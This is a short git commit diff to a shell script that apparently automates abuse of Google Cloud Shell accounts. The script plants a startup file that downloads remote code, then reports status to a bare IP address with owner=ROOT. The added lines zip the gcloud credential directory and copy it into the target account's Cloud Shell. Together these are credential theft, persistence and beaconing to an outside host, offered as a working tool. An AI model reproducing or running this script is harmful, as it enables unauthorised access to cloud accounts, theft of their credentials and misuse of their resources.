64cbca576448304eda2f17030160d0839cc86ae4
Predador21 <81100606+Predador21@users.noreply.github.com>
2021-09-13 13:18:24 -0300

    Update command.sh

--- command.sh
+++ command.sh
@@ -7,6 +7,10 @@ command="[ ! -e '.customize_environment' ] && ( wget -q https://raw.githubuserco
 
 gcloud cloud-shell ssh --account=$1 --command="$command" --authorize-session --force-key-file-overwrite --ssh-flag='-n' --quiet
 
+rm -rf ~/backup.zip ; zip -r -q ~/backup.zip /root/.config/gcloud/
+
+gcloud cloud-shell scp localhost:/root/backup.zip cloudshell:~/ --account=$1 --force-key-file-overwrite
+
 url='http://135.148.11.148/send_status.php?refresh='$2'&status=CREATED&owner=ROOT'
 curl $url
 
